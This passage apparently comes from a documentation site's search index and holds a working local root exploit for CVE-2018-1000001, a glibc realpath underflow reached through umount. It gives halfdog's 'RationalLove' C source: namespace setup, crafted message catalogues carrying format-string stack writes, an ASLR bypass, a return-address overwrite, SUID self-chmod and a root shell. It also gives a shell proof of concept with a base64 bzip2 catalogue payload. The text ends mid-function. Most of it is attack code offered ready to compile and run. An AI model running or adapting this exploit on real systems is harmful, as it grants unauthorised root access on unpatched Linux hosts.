injection procedure apparently did\n// not work, so this escalation failed.\n              goto attemptEscalationCleanup;\n            }\n            moveLength+=sizeof(long)*2;\n            stackDataBytes+=sizeof(long);\n// See if we reached end of stack dump already.\n            if(stackDataBytes==sizeof(stackData))\n              break;\n          }\n          if(stackDataBytes!=sizeof(stackData))\n            break;\n\n\n// All data read, use it to prepare the content for the next phase.\n          fprintf(stderr, \"Stack content received, calculating next phase\\n\");\n\n\n          int *exploitOffsets=(int*)osReleaseExploitData[3];\n\n\n// This is the address, where source Pointer is pointing to.\n          void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];\n// This is the stack address source for the target pointer.\n          void *sourcePointerLocation=sourcePointerTarget-0xd0;\n\n\n          void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];\n// This is the stack address of the libc start function return\n// pointer.\n          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;\n          fprintf(stderr, \"Found source address location %p pointing to target address %p with value %p, libc offset is %p\\n\",\n              sourcePointerLocation, sourcePointerTarget,\n              targetPointerTarget, libcStartFunctionReturnAddressSource);\n// So the libcStartFunctionReturnAddressSource is the lowest address\n// to manipulate, targetPointerTarget+...\n\n\n          void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];\n          void *stackWriteData[]={\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]\n          };\n          fprintf(stderr, \"Changing return address from %p to %p, %p\\n\",\n              libcStartFunctionAddress, stackWriteData[0],\n              stackWriteData[1]);\n          escalationPhase++;\n\n\n          char *escalationString=(char*)malloc(1024);\n          createStackWriteFormatString(\n              escalationString, 1024,\n              exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf\n              sourcePointerTarget, // Base value to write\n              exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...\n              libcStartFunctionReturnAddressSource,\n              (unsigned short*)stackWriteData,\n              sizeof(stackWriteData)/sizeof(unsigned short)\n          );\n          fprintf(stderr, \"Using escalation string %s\", escalationString);\n\n\n          result=writeMessageCatalogue(\n              secondPhaseCataloguePathname,\n              (char*[]){\n                  \"%s: mountpoint not found\",\n                  \"%s: not mounted\",\n                  \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n              },\n              (char*[]){\n                  escalationString,\n                  \"BBBB5678%3$s\\n\",\n                  \"BBBBABCD%s\\n\"},\n              3);\n          assert(!result);\n          break;\n        case 2:\n        case 3:\n// Wait for pipe connection and output any result from mount.\n          readDataLength=0;\n          break;\n        default:\n          fprintf(stderr, \"Logic error, state %d\\n\", escalationPhase);\n          goto attemptEscalationCleanup;\n      }\n      if(moveLength) {\n        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);\n        readDataLength-=moveLength;\n      }\n    }\n  }\n\n\nattemptEscalationCleanup:\n// Wait some time to avoid killing umount even when exploit was\n// successful.\n  sleep(1);\n  close(childStdout);\n// It is safe to kill the child as we did not wait for it to finish\n// yet, so at least the zombie process is still here.\n  kill(childPid, SIGKILL);\n  pid_t waitedPid=waitpid(childPid, NULL, 0);\n  assert(waitedPid==childPid);\n\n\n  return(escalationSuccess);\n}\n\n\n\n\n/** This function invokes the shell specified via environment\n *  or the default shell \"/bin/sh\" when undefined. The function\n *  does not return on success.\n *  @return -1 on error\n */\nint invokeShell(char *shellName) {\n  if(!shellName)\n    shellName=getenv(\"SHELL\");\n  if(!shellName)\n    shellName=\"/bin/sh\";\n  char* shellArgs[]={shellName, NULL};\n  execve(shellName, shellArgs, environ);\n  fprintf(stderr, \"Failed to launch shell %s\\n\", shellName);\n  return(-1);\n}\n\n\nint main(int argc, char **argv) {\n  char *programmName=argv[0];\n  int exitStatus=1;\n\n\n  if(getuid()==0) {\n    fprintf(stderr, \"%s: you are already root, invoking shell ...\\n\",\n        programmName);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  if(geteuid()==0) {\n    struct stat statBuf;\n    int result=stat(\"/proc/self/exe\", &statBuf);\n    assert(!result);\n    if(statBuf.st_uid||statBuf.st_gid) {\n      fprintf(stderr, \"%s: internal invocation, setting SUID mode\\n\",\n          programmName);\n      int handle=open(\"/proc/self/exe\", O_RDONLY);\n      fchown(handle, 0, 0);\n      fchmod(handle, 04755);\n      exit(0);\n    }\n\n\n    fprintf(stderr, \"%s: invoked as SUID, invoking shell ...\\n\",\n        programmName);\n    setresgid(0, 0, 0);\n    setresuid(0, 0, 0);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  for(int argPos=1; argPos<argc;) {\n    char *argName=argv[argPos++];\n    if(argPos==argc) {\n      fprintf(stderr, \"%s requires parameter\\n\", argName);\n      return(1);\n    }\n    if(!strcmp(\"--Pid\", argName)) {\n      char *endPtr;\n      namespacedProcessPid=strtoll(argv[argPos++], &endPtr, 10);\n      if((errno)||(*endPtr)) {\n        fprintf(stderr, \"Invalid pid value\\n\");\n        return(1);\n      }\n      killNamespacedProcessFlag=0;\n    } else {\n      fprintf(stderr, \"Unknown argument %s\\n\", argName);\n      return(1);\n    }\n  }\n\n\n  fprintf(stderr, \"%s: setting up environment ...\\n\", programmName);\n\n\n  if(!osRelease) {\n    if(detectOsRelease()) {\n      fprintf(stderr, \"Failed to detect OS version, continuing anyway\\n\");\n    }\n  }\n\n\n  umountPathname=findUmountBinaryPathname(\"/bin\");\n  if((!umountPathname)&&(getenv(\"PATH\")))\n    umountPathname=findUmountBinaryPathname(getenv(\"PATH\"));\n  if(!umountPathname) {\n    fprintf(stderr, \"Failed to locate \\\"umount\\\" binary, is PATH correct?\\n\");\n    goto preReturnCleanup;\n  }\n  fprintf(stderr, \"%s: using umount at \\\"%s\\\".\\n\", programmName,\n      umountPathname);\n\n\n  pid_t nsPid=prepareNamespacedProcess();\n  if(nsPid<0) {\n    goto preReturnCleanup;\n  }\n\n\n// Gaining root can still fail due to ASLR creating additional\n// path separators in memory addresses residing in area to be\n// overwritten by buffer underflow. Retry regaining until this\n// executable changes uid/gid.\n  int escalateMaxAttempts=10;\n  int excalateCurrentAttempt=0;\n  while(excalateCurrentAttempt<escalateMaxAttempts) {\n    excalateCurrentAttempt++;\n    fprintf(stderr, \"Attempting to gain root, try %d of %d ...\\n\",\n        excalateCurrentAttempt, escalateMaxAttempts);\n\n\n    attemptEscalation();\n\n\n    struct stat statBuf;\n    int statResult=stat(\"/proc/self/exe\", &statBuf);\n       int stat(const char *pathname, struct stat *buf);\n    if(statResult) {\n      fprintf(stderr, \"Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\\n\");\n      break;\n    }\n    if(statBuf.st_uid==0) {\n      fprintf(stderr, \"Executable now root-owned\\n\");\n      goto escalateOk;\n    }\n  }\n\n\n  fprintf(stderr, \"Escalation FAILED, maybe target system not (yet) supported by exploit!\\n\");\n\n\npreReturnCleanup:\n  if(namespacedProcessPid>0) {\n    if(killNamespacedProcessFlag) {\n      kill(namespacedProcessPid, SIGKILL);\n    } else {\n// We used an existing namespace or chroot to escalate. Remove\n// the files created there.\n      fprintf(stderr, \"No namespace cleanup for preexisting namespaces yet, do it manually.\\n\");\n    }\n  }\n\n\n  if(!exitStatus) {\n    fprintf(stderr, \"Cleanup completed, re-invoking binary\\n\");\n    invokeShell(\"/proc/self/exe\");\n    exitStatus=1;\n  }\n  return(exitStatus);\n\n\nescalateOk:\n  exitStatus=0;\n  goto preReturnCleanup;\n}",
            "title": "Cve 2018 1000001 01"
        },
        {
            "location": "/cve-2018-1000001-01/#cve-2018-1000001",
            "text": "",
            "title": "cve-2018-1000001\u9644\u4ef6"
        },
        {
            "location": "/cve-2018-1000001-01/#poc",
            "text": "# Line 1\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n# Line 2-5\n/usr/bin/unshare -m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\n\n\n# Line 6-9\nmkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\nbase64 -d <<B64-EOF | bzip2 -cd > \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\nQlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\nmQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\niG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\nB64-EOF\necho \"$$\"\n2299\n\n\n# Line 10-11\ntest$ cd /proc/2299/cwd\ntest$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\numount: AAlnAAAAAAAAAAA",
            "title": "poc\u6e90\u7801"
        },
        {
            "location": "/cve-2018-1000001-01/#exp",
            "text": "/** This software is provided by the copyright owner \"as is\"\n *  and without any expressed or implied warranties, including,\n *  but not limited to, the implied warranties of merchantability\n *  and fitness for a particular purpose are disclaimed. In no\n *  event shall the copyright owner be liable for any direct,\n *  indirect, incidential, special, exemplary or consequential\n *  damages, including, but not limited to, procurement of substitute\n *  goods or services, loss of use, data or profits or business\n *  interruption, however caused and on any theory of liability,\n *  whether in contract, strict liability, or tort, including\n *  negligence or otherwise, arising in any way out of the use\n *  of this software, even if advised of the possibility of such\n *  damage.\n *\n *  Copyright (c) 2018 halfdog <me (%) halfdog.net>\n *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.\n *\n *  This tool exploits a buffer underflow in glibc realpath()\n *  and was tested against latest release from Debian, Ubuntu\n *  Mint. It is intended as demonstration of ASLR-aware exploitation\n *  techniques. It uses relative binary offsets, that may be different\n *  for various Linux distributions and builds. Please send me\n *  a patch when you developed a new set of parameters to add\n *  to the osSpecificExploitDataList structure and want to contribute\n *  them.\n *\n *  Compile: gcc -o RationalLove RationalLove.c\n *  Run: ./RationalLove\n *\n *  You may also use \"--Pid\" parameter, if you want to test the\n *  program on already existing namespaced or chrooted mounts.\n *\n *  Revisions:\n *  * 20180722: Fixed escalation failure on Xenial desktop install\n *    related to definition of \"/\" in \"/run/mount/utab\". Also\n *    fixed compiler warnings.\n */\n\n\n#define _GNU_SOURCE\n#include <assert.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <limits.h>\n#include <poll.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\n\n\n\n#define UMOUNT_ENV_VAR_COUNT 256\n\n\n/** Dump that number of bytes from stack to perform anti-ASLR.\n *  This number should be high enough to reproducible reach the\n *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of\n *  environment variable references but low enough to avoid hitting\n *  upper stack limit, which would cause a crash.\n */\n#define STACK_LONG_DUMP_BYTES 4096\n\n\nchar *messageCataloguePreamble=\"Language: en\\n\"\n    \"MIME-Version: 1.0\\n\"\n    \"Content-Type: text/plain; charset=UTF-8\\n\"\n    \"Content-Transfer-Encoding: 8bit\\n\";\n\n\n/** The pid of a namespace process with the working directory\n *  at a writable /tmp only visible by the process. */\npid_t namespacedProcessPid=-1;\n\n\nint killNamespacedProcessFlag=1;\n\n\n/** The pathname to the umount binary to execute. */\nchar *umountPathname;\n\n\n/** The pathname to the named pipe, that will synchronize umount\n *  binary with supervisory process before triggering the second\n *  and last exploitation phase.\n */\nchar *secondPhaseTriggerPipePathname;\n\n\n/** The pathname to the second phase exploitation catalogue file.\n *  This is needed as the catalogue cannot be sent via the trigger\n *  pipe from above.\n */\nchar *secondPhaseCataloguePathname;\n\n\n/** The OS-release detected via /etc/os-release. */\nchar *osRelease=NULL;\n\n\n/** This table contains all relevant information to adapt the\n *  attack to supported Linux distros (fully updated) to support\n *  also older versions, hash of umount/libc/libmount should be\n *  used also for lookups.\n *  The 4th string is an array of 4-byte integers, that are addressed\n *  using the \"ED_...\" constants.\n */\n// Stack offset of libmount ctx pointer when addressing it via\n// printf format string argument skipping syntax, thus causing\n// 8 byte words to be skipped when incrementing by one.\n#define ED_STACK_OFFSET_CTX 0\n// Format string argument skipping for argv array.\n#define ED_STACK_OFFSET_ARGV 1\n// Format string argument skipping for argv[0].\n#define ED_STACK_OFFSET_ARG0 2\n// Delta of getdate() function from __libc_start_main position\n// after return from main().\n#define ED_LIBC_GETDATE_DELTA 3\n// Delta of execl() function from __libc_start_main ...\n#define ED_LIBC_EXECL_DELTA 4\nstatic char* osSpecificExploitDataList[]={\n// Debian Stretch\n    \"\\\"9 (stretch)\\\"\",\n    \"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\",\n    \"__gconv_find_shlib\",\n    \"\\x06\\0\\0\\0\\x24\\0\\0\\0\\x3e\\0\\0\\0\\x7f\\xb9\\x08\\x00\\xef\\x85\\x09\\x00\",\n    NULL};\n\n\nchar **osReleaseExploitData=NULL;\n\n\n/** Locate the umount binary within the given search path list,\n *  elements separated by colons.\n *  @return a pointer to a malloced memory region containing the\n *  string or NULL if not found.\n */\nchar* findUmountBinaryPathname(char *searchPath) {\n  char *testPathName=(char*)malloc(PATH_MAX);\n  assert(testPathName);\n\n\n  while(*searchPath) {\n    char *endPtr=strchr(searchPath, ':');\n    int length=endPtr-searchPath;\n    if(!endPtr) {\n      length=strlen(searchPath);\n      endPtr=searchPath+length-1;\n    }\n    int result=snprintf(testPathName, PATH_MAX, \"%.*s/%s\", length,\n        searchPath, \"umount\");\n    if(result>=PATH_MAX) {\n      fprintf(stderr, \"Binary search path element too long, ignoring it.\\n\");\n    } else {\n      struct stat statBuf;\n      result=stat(testPathName, &statBuf);\n// Just assume, that umount is owner-executable. There might be\n// alternative ACLs, which grant umount execution only to selected\n// groups, but it would be unusual to have different variants\n// of umount located searchpath on the same host.\n      if((!result)&&(S_ISREG(statBuf.st_mode))&&(statBuf.st_mode&S_IXUSR)) {\n        return(testPathName);\n      }\n    }\n    searchPath=endPtr+1;\n  }\n\n\n  free(testPathName);\n  return(NULL);\n}\n\n\n\n\n/** Get the value for a given field name.\n *  @return NULL if not found, a malloced string otherwise.\n */\nchar* getReleaseFileField(char *releaseData, int dataLength, char *fieldName) {\n  int nameLength=strlen(fieldName);\n  while(dataLength>0) {\n    char *nextPos=memchr(releaseData, '\\n', dataLength);\n    int lineLength=dataLength;\n    if(nextPos) {\n      lineLength=nextPos-releaseData;\n      nextPos++;\n    } else {\n      nextPos=releaseData+dataLength;\n    }\n    if((!strncmp(releaseData, fieldName, nameLength))&&\n        (releaseData[nameLength]=='=')) {\n      return(strndup(releaseData+nameLength+1, lineLength-nameLength-1));\n    }\n    releaseData=nextPos;\n    dataLength-=lineLength;\n  }\n  return(NULL);\n}\n\n\n\n\n/** Detect the release by reading the VERSION field from /etc/os-release.\n *  @return 0 on success.\n */\nint detectOsRelease() {\n  int handle=open(\"/etc/os-release\", O_RDONLY);\n  if(handle<0)\n    return(-1);\n\n\n  char *buffer=alloca(1024);\n  int infoLength=read(handle, buffer, 1024);\n  close(handle);\n  if(infoLength<0)\n    return(-1);\n  osRelease=getReleaseFileField(buffer, infoLength, \"VERSION\");\n  if(!osRelease)\n    osRelease=getReleaseFileField(buffer, infoLength, \"NAME\");\n  if(osRelease) {\n    fprintf(stderr, \"Detected OS version: %s\\n\", osRelease);\n    return(0);\n  }\n\n\n  return(-1);\n}\n\n\n\n\n/** Create the catalogue data in memory.\n *  @return a pointer to newly allocated catalogue data memory\n */\nchar* createMessageCatalogueData(char **origStringList, char **transStringList,\n    int stringCount, int *catalogueDataLength) {\n  int contentLength=strlen(messageCataloguePreamble)+2;\n  for(int stringPos=0; stringPos<stringCount; stringPos++) {\n    contentLength+=strlen(origStringList[stringPos])+\n        strlen(transStringList[stringPos])+2;\n  }\n  int preambleLength=(0x1c+0x14*(stringCount+1)+0xc)&-0xf;\n  char *catalogueData=(char*)malloc(preambleLength+contentLength);\n  memset(catalogueData, 0, preambleLength);\n  int *preambleData=(int*)catalogueData;\n  *preambleData++=0x950412de;\n  preambleData++;\n  *preambleData++=stringCount+1;\n  *preambleData++=0x1c;\n  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;\n  *preambleData++=0x5;\n  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;\n\n\n  char *nextCatalogueStringStart=catalogueData+preambleLength;\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?\"\":origStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?messageCataloguePreamble:transStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);\n  for(int stringPos=0; stringPos<=stringCount+1; stringPos++) {\n//    *preambleData++=(stringPos+1);\n    *preambleData++=(int[]){1, 3, 2, 0, 4}[stringPos];\n  }\n  *catalogueDataLength=preambleLength+contentLength;\n  return(catalogueData);\n}\n\n\n\n\n/** Create the catalogue data from the string lists and write\n *  it to the given file.\n *  @return 0 on success.\n */\nint writeMessageCatalogue(char *pathName, char **origStringList,\n    char **transStringList, int stringCount) {\n  int catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, 0644);\n  if(catalogueFd<0) {\n    fprintf(stderr, \"Failed to open catalogue file %s for writing.\\n\",\n        pathName);\n    return(-1);\n  }\n  int catalogueDataLength;\n  char *catalogueData=createMessageCatalogueData(\n      origStringList, transStringList, stringCount, &catalogueDataLength);\n  int result=write(catalogueFd, catalogueData, catalogueDataLength);\n  assert(result==catalogueDataLength);\n  close(catalogueFd);\n  free(catalogueData);\n  return(0);\n}\n\n\nvoid createDirectoryRecursive(char *namespaceMountBaseDir, char *pathName) {\n  char pathBuffer[PATH_MAX];\n  int pathNameLength=0;\n  while(1) {\n    char *nextPathSep=strchr(pathName+pathNameLength, '/');\n    if(nextPathSep) {\n      pathNameLength=nextPathSep-pathName;\n    } else {\n      pathNameLength=strlen(pathName);\n    }\n    int result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/%.*s\",\n        namespaceMountBaseDir, pathNameLength, pathName);\n    assert(result<PATH_MAX);\n    result=mkdir(pathBuffer, 0755);\n    assert((!result)||(errno==EEXIST));\n    if(!pathName[pathNameLength])\n      break;\n    pathNameLength++;\n  }\n}\n\n\n\n\n/** This child function prepares the namespaced mount point and\n *  then waits to be killed later on.\n */\nstatic int usernsChildFunction() {\n  while(geteuid()!=0) {\n    sched_yield();\n  }\n  int result=mount(\"tmpfs\", \"/tmp\", \"tmpfs\", MS_MGC_VAL, NULL);\n  assert(!result);\n  assert(!chdir(\"/tmp\"));\n  int handle=open(\"ready\", O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, 0644);\n  assert(handle>=0);\n  close(handle);\n  sleep(100000);\n}\n\n\n/** Prepare a process living in an own mount namespace and setup\n *  the mount structure appropriately. The process is created\n *  in a way allowing cleanup at program end by just killing it,\n *  thus removing the namespace.\n *  @return the pid of that process or -1 on error.\n */\npid_t prepareNamespacedProcess() {\n  if(namespacedProcessPid==-1) {\n    fprintf(stderr, \"No pid supplied via command line, trying to create a namespace\\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\\n\");\n\n\n    char *stackData=(char*)malloc(1<<20);\n    assert(stackData);\n    namespacedProcessPid=clone(usernsChildFunction, stackData+(1<<20),\n        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);\n    if(namespacedProcessPid==-1) {\n      fprintf(stderr, \"USERNS clone failed: %d (%s)\\n\", errno, strerror(errno));\n      return(-1);\n    }\n\n\n    char idMapFileName[128];\n    char idMapData[128];\n    sprintf(idMapFileName, \"/proc/%d/setgroups\", namespacedProcessPid);\n    int setGroupsFd=open(idMapFileName, O_WRONLY);\n    assert(setGroupsFd>=0);\n    int result=write(setGroupsFd, \"deny\", 4);\n    assert(result>0);\n    close(setGroupsFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/uid_map\", namespacedProcessPid);\n    int uidMapFd=open(idMapFileName, O_WRONLY);\n    assert(uidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getuid());\n    result=write(uidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(uidMapFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/gid_map\", namespacedProcessPid);\n    int gidMapFd=open(idMapFileName, O_WRONLY);\n    assert(gidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getgid());\n    result=write(gidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(gidMapFd);\n\n\n// After setting the maps for the child process, the child may\n// start setting up the mount point. Wait for that to complete.\n    sleep(1);\n    fprintf(stderr, \"Namespaced filesystem created with pid %d\\n\",\n        namespacedProcessPid);\n  }\n\n\n//   osReleaseExploitData=osSpecificExploitDataList;\n//   if(osRelease) {\n// // If an OS was detected, try to find it in list. Otherwise use\n// // default.\n//     for(int tPos=0; osSpecificExploitDataList[tPos]; tPos+=4) {\n//       if(!strcmp(osSpecificExploitDataList[tPos], osRelease)) {\n//         osReleaseExploitData=osSpecificExploitDataList+tPos;\n//         break;\n//       }\n//     }\n//   }\n  osReleaseExploitData = osSpecificExploitDataList;\n\n\n  char pathBuffer[PATH_MAX];\n  int result=snprintf(pathBuffer, sizeof(pathBuffer), \"/proc/%d/cwd\",\n     namespacedProcessPid);\n  assert(result<PATH_MAX);\n  char *namespaceMountBaseDir=strdup(pathBuffer);\n  assert(namespaceMountBaseDir);\n\n\n// Create directories needed for umount to proceed to final state\n// \"not mounted\".\n  createDirectoryRecursive(namespaceMountBaseDir, \"(unreachable)/x\");\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES\", osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.X/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.x/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n\n\n// Create symlink to trigger underflows.\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/(unreachable)/tmp/down\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  result=symlink(osReleaseExploitData[1], pathBuffer);\n  assert(!result||(errno==EEXIST));\n\n\n// getdate will leave that string in rdi to become the filename\n// to execute for the next round.\n  char *selfPathName=realpath(\"/proc/self/exe\", NULL);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/DATEMSK\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);\n  assert(handle>0);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"#!%s\\nunused\",\n      selfPathName);\n  assert(result<PATH_MAX);\n  result=write(handle, pathBuffer, result);\n  close(handle);\n  free(selfPathName);\n\n\n// Write the initial message catalogue to trigger stack dumping\n// and to make the \"umount\" call privileged by toggling the \"restricted\"\n// flag in the context.\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n\n\n  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));\n  assert(stackDumpStr);\n  char *stackDumpStrEnd=stackDumpStr;\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"AA%%%d$lnAAAAAA\",\n      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);\n  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {\n    memcpy(stackDumpStrEnd, \"%016lx\", 6);\n    stackDumpStrEnd+=6;\n  }\n// We wrote allready 8 bytes, write so many more to produce a\n// count of 'L' and write that to the stack. As all writes so\n// sum up to a count aligned by 8, and 'L'==0x4c, we will have\n// to write at least 4 bytes, which is longer than any \"%hhx\"\n// format string output. Hence do not care about the byte content\n// here. The target write address has a 16 byte alignment due\n// to varg structure.\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"%%1$%dhhx%%%d$hhn\",\n      ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,\n      STACK_LONG_DUMP_BYTES/16);\n  *stackDumpStrEnd=0;\n  result=writeMessageCatalogue(pathBuffer,\n      (char*[]){\n          \"%s: mountpoint not found\",\n          \"%s: not mounted\",\n          \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n      },\n      (char*[]){\"1234\", stackDumpStr, \"5678\"},\n      3);\n  assert(!result);\n  free(stackDumpStr);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);\n  assert((!result)||(errno==EEXIST));\n  secondPhaseTriggerPipePathname=strdup(pathBuffer);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  secondPhaseCataloguePathname=strdup(pathBuffer);\n\n\n  free(namespaceMountBaseDir);\n  return(namespacedProcessPid);\n}\n\n\n\n\n\n\n/** Create the format string to write an arbitrary value to the\n *  stack. The created format string avoids to interfere with\n *  the complex fprintf format handling logic by accessing fprintf\n *  internal state on stack. Thus the modification method does\n *  not depend on that ftp internals. The current libc fprintf\n *  implementation copies values for formatting before applying\n *  the %n writes, therefore pointers changed by fprintf operation\n *  can only be utilized with the next fprintf invocation. As\n *  we cannot rely on a stack having a suitable number of pointers\n *  ready for arbitrary writes, we need to create those pointers\n *  one by one. Everything needed is pointer on stack pointing\n *  to another valid pointer and 4 helper pointers pointing to\n *  writeable memory. The **argv list matches all those requirements.\n *  @param printfArgvValuePos the position of the argv pointer from\n *  printf format string view.\n *  @param argvStackAddress the address of the argv list, where\n *  the argv[0] pointer can be read.\n *  @param printfArg0ValuePos the position of argv list containing\n *  argv[0..n] pointers.\n *  @param mainFunctionReturnAddress the address on stack where\n *  the return address from the main() function to _libc_start()\n *  is stored.\n *  @param writeValue the value to write to mainFunctionReturnAddress\n */\nvoid createStackWriteFormatString(\n    char *formatBuffer, int bufferSize, int printfArgvValuePos,\n    void *argvStackAddress, int printfArg0ValuePos,\n    void *mainFunctionReturnAddress, unsigned short *writeData,\n    int writeDataLength) {\n  int result=0;\n  int currentValue=-1;\n  for(int nextWriteValue=0; nextWriteValue<0x10000;) {\n// Find the lowest value to write.\n    nextWriteValue=0x10000;\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       int value=writeData[valuePos];\n       if((value>currentValue)&&(value<nextWriteValue))\n         nextWriteValue=value;\n    }\n    if(currentValue<0)\n      currentValue=0;\n    if(currentValue!=nextWriteValue) {\n      result=snprintf(formatBuffer, bufferSize, \"%%1$%1$d.%1$ds\",\n          nextWriteValue-currentValue);\n      formatBuffer+=result;\n      bufferSize-=result;\n      currentValue=nextWriteValue;\n    }\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       if(writeData[valuePos]==nextWriteValue) {\n          result=snprintf(formatBuffer, bufferSize,\n              \"%%%d$hn\", printfArg0ValuePos+valuePos+1);\n          formatBuffer+=result;\n          bufferSize-=result;\n       }\n    }\n  }\n\n\n// Print the return function address location number of bytes\n// except 8 (those from the LABEL counter) and write the value\n// to arg1.\n  int writeCount=((long long)mainFunctionReturnAddress-18)&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$%d.%ds%%1$s%%1$s%%%d$hn\",\n      writeCount, writeCount, printfArg0ValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Write the LABEL 6 more times, thus multiplying the the single\n// byte 